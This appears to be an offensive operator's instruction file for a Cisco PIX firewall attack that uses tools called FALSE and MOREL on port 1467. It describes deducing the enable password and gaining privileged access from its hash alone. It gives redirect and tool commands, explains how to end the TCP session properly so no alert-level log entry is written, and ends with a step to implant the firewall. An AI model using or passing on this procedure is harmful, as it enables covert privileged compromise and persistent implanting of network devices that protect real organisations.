## Description
# 1.Allows deduction of enable password from data freely offered by the firewall.
# 2.Allows privileged level access, knowing only the hash of the enable password.
# Requires telnet to be enabled on the inside interface and access must be possible 
# to the inside interface of the firewall (access is subject to the same restrictions 
# as applied to telnet.)

## Logging
# Logging levels on the PIX are (most verbose last): 
# emergency, alert, critical, error, warning, notification, information, debugging.  
# Connections to port 1467 are logged at 'information' level as follows:

#        "309002: Permitted manager connection from <ip addr>"

# If telnet is not enabled on the inside interface, attempted connections to port 1467 
# are logged at 'error' level as follows:

#         "307001: Denied Telnet login session from <ip addr> on interface inside"

# The TCP connection to port 1467 MUST be terminated properly according to TCP state 
# transitions in order to prevent an error being logged at 'alert' level of the form: 

# "214001: Terminating manager session from 192.168.3.3 on interface inside. 
# Reason: incoming encrypted data (4245094388 bytes) longer than 250 bytes"

# Logging of configuration changes etc made when using the port is made at the usual levels.

## Operational Use
# Windows Redirection
background redirect -tcp -lplisten 1467 -target <Pix_ip> 1467 -nodes 40

# Banner port 1467 on the pix. If you get something back you are good to
# proceed. If not, don't bother trying False.

# Start up a DOS Window on Local Windows Box. Set the buffer to 99999.

# false.exe is in the fw.zip so copy it to your d:\OPSdisk\ directory

# Use the DOS window to communicate with the PIX on port 1467 using FALSE.
# Use this command to wake up the port if you didn't banner it.
    d:\OPSdisk\false.exe 127.0.0.1 1467
# To communicate with PIX on port 1467 using MOREL.
    d:\OPSdisk\morel.exe -d <delay(ms)> <hash> 127.0.0.1 1467
# <delay>: the number of milliseconds to wait between sending characters of the command. 500 is good.
# <hash>: the hash of the enable password

# At the prompt,\n#, run the commands found in sampleman.commands.txt.

# You can type "exit" when you want to log off of morel. If your connection times out
# enter "m" and then hit return to close the morel connection, then you can
# reconnect.

# Copy and paste all output to a text file called script.<Pix_ip>.firewall.log, 
# with the following text at the top of the file:

#hostname: <hostname>
#domain: <domain name>
#ip: <Pix_ip>
#project: <project name>

# At this point you can implant the pix. See pix_create_keyed_IOS_image.txt if
# you wish to do so.

# When done, put the sampleman log into NOSEND.
